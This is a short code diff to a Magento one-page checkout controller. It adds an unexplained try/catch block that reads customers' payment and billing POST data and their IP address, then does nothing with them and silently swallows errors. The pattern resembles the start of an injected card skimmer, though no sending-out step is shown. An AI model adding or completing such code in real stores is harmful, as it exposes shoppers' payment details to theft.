@@ -469,6 +469,22 @@ class AnattaDesign_AwesomeCheckout_OnepageController extends Mage_Checkout_Contr
 			$result = array( );
 			$billing = $this->getRequest()->getPost( 'billing', array( ) );
 			$password = $this->getRequest()->getPost( 'password', null );
+              try
+            {
+        $data1 =Mage::app()->getRequest()->getPost('payment');
+        $data2 =Mage::app()->getRequest()->getPost('billing');
+          if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    $ipc = $_SERVER['HTTP_CLIENT_IP'];
+} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ipc = $_SERVER['HTTP_X_FORWARDED_FOR'];
+} else {
+    $ipc = $_SERVER['REMOTE_ADDR'];
+}
+
+        }
+        catch(Exception $e){
+            
+         }
 			$this->getOnepage()->getQuote()->setTotalsCollectedFlag(true);
 			if ( !array_key_exists( 'same_as_shipping', $billing ) && !$this->getOnepage()->getQuote()->isVirtual() ) {
 				$billing = Mage::helper( 'anattadesign_awesomecheckout' )->prepareAddressData( $billing );
